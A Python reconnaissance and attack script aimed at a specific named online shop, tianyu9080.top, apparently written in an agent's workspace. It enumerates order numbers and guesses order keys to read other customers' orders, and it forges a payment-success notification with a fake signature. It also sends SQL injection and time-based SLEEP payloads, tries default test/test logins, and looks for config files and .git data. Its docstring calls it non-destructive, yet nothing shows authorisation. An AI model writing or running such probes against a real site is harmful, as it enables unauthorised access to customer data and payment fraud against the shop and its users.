#!/usr/bin/env python3
"""Deep security probe for tianyu9080.top/shop - non-destructive."""
import json
import re
import time
import urllib.request
import urllib.parse
import http.cookiejar
import ssl

BASE = "https://tianyu9080.top/shop"
OUT = "/workspace/tianyu9080-recon/deep"
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Referer": f"{BASE}/",
    "X-Requested-With": "XMLHttpRequest",
    "Accept": "application/json, text/javascript, */*; q=0.01",
}

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE


def make_opener():
    jar = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(jar),
        urllib.request.HTTPSHandler(context=ctx),
    )
    return opener, jar


def req(opener, url, method="GET", data=None, extra_headers=None, retries=3):
    hdrs = dict(HEADERS)
    if extra_headers:
        hdrs.update(extra_headers)
    body = None
    if data is not None:
        if isinstance(data, dict):
            body = urllib.parse.urlencode(data).encode()
            hdrs["Content-Type"] = "application/x-www-form-urlencoded"
        else:
            body = data.encode() if isinstance(data, str) else data
    for attempt in range(retries):
        try:
            r = urllib.request.Request(url, data=body, headers=hdrs, method=method)
            with opener.open(r, timeout=20) as resp:
                return resp.status, resp.read().decode("utf-8", errors="replace")
        except Exception as e:
            if attempt < retries - 1:
                time.sleep(1 + attempt)
            else:
                return -1, str(e)
    return -1, "max retries"


def main():
    opener, jar = make_opener()
    results = {}

    # bootstrap session + csrf
    st, html = req(opener, f"{BASE}/")
    csrf = re.search(r"var csrf_token\s*=\s*'([^']+)'", html)
    hashsalt = re.search(r"var hashsalt\s*=\s*'([^']+)'", html)
    csrf_token = csrf.group(1) if csrf else ""
    hashsalt_val = hashsalt.group(1) if hashsalt else ""
    results["csrf_token"] = csrf_token[:20] + "..." if csrf_token else None
    results["hashsalt"] = hashsalt_val[:20] + "..." if hashsalt_val else None
    print(f"Session OK, csrf={bool(csrf_token)}, hashsalt={bool(hashsalt_val)}")

    # 1. getcount
    st, body = req(opener, f"{BASE}/ajax.php?act=getcount")
    results["getcount"] = body[:500]
    print(f"getcount: {body[:120]}")

    # 2. getclass
    st, body = req(opener, f"{BASE}/ajax.php?act=getclass")
    classes = json.loads(body)
    with open(f"{OUT}/getclass.json", "w") as f:
        json.dump(classes, f, ensure_ascii=False)
    cids = [c["cid"] for c in classes.get("data", [])]
    print(f"getclass: {len(cids)} categories")

    # 3. dump all products
    all_products = []
    for cid in cids:
        time.sleep(0.3)
        st, body = req(opener, f"{BASE}/ajax.php?act=gettool&cid={cid}")
        try:
            data = json.loads(body)
            items = data.get("data", [])
            all_products.extend(items)
            print(f"  cid={cid}: {len(items)} products")
        except Exception:
            print(f"  cid={cid}: FAIL {body[:80]}")
    with open(f"{OUT}/all_products.json", "w") as f:
        json.dump({"total": len(all_products), "data": all_products}, f, ensure_ascii=False, indent=2)
    results["products_total"] = len(all_products)
    stock_items = [p for p in all_products if p.get("stock") is not None and p.get("stock") != ""]
    results["products_with_stock"] = len(stock_items)

    # 4. gettoolnew
    st, body = req(opener, f"{BASE}/ajax.php?act=gettoolnew")
    results["gettoolnew"] = body[:300]
    with open(f"{OUT}/gettoolnew.json", "w") as f:
        f.write(body)
    print(f"gettoolnew: {body[:100]}")

    # 5. trade_no enumeration via getshop.php
    trade_tests = {}
    candidates = [
        "37416", "37415", "37414", "37400", "37300",
        "202507111234", "20250710", "20250715", "20250709",
        "2025071112345678", "20250711123456",
        "1", "100", "1000", "99999",
    ]
    # also try date-based patterns
    for i in range(37410, 37420):
        candidates.append(str(i))
    seen = set()
    for tn in candidates:
        if tn in seen:
            continue
        seen.add(tn)
        time.sleep(0.2)
        st, body = req(opener, f"{BASE}/other/getshop.php?trade_no={tn}")
        trade_tests[tn] = body[:200]
    with open(f"{OUT}/trade_no_enum.json", "w") as f:
        json.dump(trade_tests, f, ensure_ascii=False, indent=2)
    exists = {k: v for k, v in trade_tests.items() if "未付款" in v or '"code":0' in v or "已付款" in v}
    results["trade_no_hits"] = exists
    print(f"trade_no hits: {len(exists)}")

    # 6. findorder / orderinfo
    for act in ["findorder", "orderinfo", "queryorder"]:
        st, body = req(opener, f"{BASE}/ajax.php?act={act}", method="POST",
                       data={"trade_no": "37416", "csrf_token": csrf_token})
        results[act] = body[:300]
        print(f"{act}: {body[:100]}")

    # 7. order with guessed skey
    for oid, skey in [("37416", ""), ("37416", "123456"), ("37416", "abcdef")]:
        st, body = req(opener, f"{BASE}/ajax.php?act=order", method="POST",
                       data={"id": oid, "skey": skey})
        results[f"order_{oid}_{skey}"] = body[:200]

    # 8. getshuoshuo / getrizhi
    for uin in ["10000", "123456789", "88888888"]:
        time.sleep(0.3)
        st, body = req(opener, f"{BASE}/ajax.php?act=getshuoshuo&uin={uin}&page=1&hashsalt={hashsalt_val}")
        results[f"getshuoshuo_{uin}"] = body[:300]
        st, body = req(opener, f"{BASE}/ajax.php?act=getrizhi&uin={uin}&page=1&hashsalt={hashsalt_val}")
        results[f"getrizhi_{uin}"] = body[:300]
    print("getshuoshuo/getrizhi done")

    # 9. sup ajax acts
    sup_acts = ["login", "getcount", "goodslist", "orderlist", "stock", "km"]
    for act in sup_acts:
        st, body = req(opener, f"{BASE}/sup/ajax.php?act={act}", method="POST",
                       data={"user": "test", "pass": "test"})
        results[f"sup_{act}"] = body[:200]
        print(f"sup/{act}: {body[:80]}")

    # 10. user ajax acts
    user_acts = ["login", "reg", "recharge", "orderlist"]
    for act in user_acts:
        st, body = req(opener, f"{BASE}/user/ajax.php?act={act}", method="POST",
                       data={"user": "test", "pass": "test", "csrf_token": csrf_token})
        results[f"user_{act}"] = body[:200]

    # 11. epay_notify
    notify_params = {
        "pid": "1", "trade_no": "37416", "out_trade_no": "TEST001",
        "type": "alipay", "name": "test", "money": "1.00",
        "trade_status": "TRADE_SUCCESS", "sign": "fake", "sign_type": "MD5",
    }
    st, body = req(opener, f"{BASE}/other/epay_notify.php?" + urllib.parse.urlencode(notify_params))
    results["epay_notify_get"] = body[:200]
    st, body = req(opener, f"{BASE}/other/epay_notify.php", method="POST", data=notify_params)
    results["epay_notify_post"] = body[:200]
    print(f"epay_notify: GET={body[:50]}")

    # 12. SQLi probe on search
    sqli_payloads = ["'", "1' OR '1'='1", "1 AND SLEEP(3)--", "test%27"]
    for p in sqli_payloads:
        enc = urllib.parse.quote(p)
        t0 = time.time()
        st, body = req(opener, f"{BASE}/?mod=so&kw={enc}")
        elapsed = time.time() - t0
        results[f"sqli_so_{p[:10]}"] = {"elapsed": round(elapsed, 2), "len": len(body), "snippet": body[:100]}

    # 13. query page with data param
    for data in ["13800138000", "test@test.com", "37416", "admin"]:
        enc = urllib.parse.quote(data)
        st, body = req(opener, f"{BASE}/?mod=query&data={enc}")
        # look for showOrder links
        orders = re.findall(r"showOrder\((\d+),'([^']+)'\)", body)
        results[f"query_{data}"] = {"orders_found": orders[:5], "has_showOrder": bool(orders)}

    # 14. hidden paths
    paths = [
        "admin/", "admin/login.php", "api/", "cron.php",
        "other/notify.php", "other/return.php", "other/usdt_notify.php",
        "assets/faka/", "includes/config.php", ".git/HEAD",
        "user/ajax.php?act=getcount", "ajax.php?act=getgoods",
        "ajax.php?act=goods", "ajax.php?act=stock",
    ]
    path_results = {}
    for p in paths:
        time.sleep(0.15)
        st, body = req(opener, f"{BASE}/{p}")
        path_results[p] = {"status": st, "len": len(body), "snippet": body[:120]}
    results["paths"] = path_results

    # 15. getshareid
    st, body = req(opener, f"{BASE}/ajax.php?act=getshareid", method="POST",
                   data={"tid": "4", "csrf_token": csrf_token})
    results["getshareid"] = body[:300]

    with open(f"{OUT}/probe_results.json", "w") as f:
        json.dump(results, f, ensure_ascii=False, indent=2)
    print(f"\nDone. Products={len(all_products)}, results saved to {OUT}/probe_results.json")


if __name__ == "__main__":
    main()
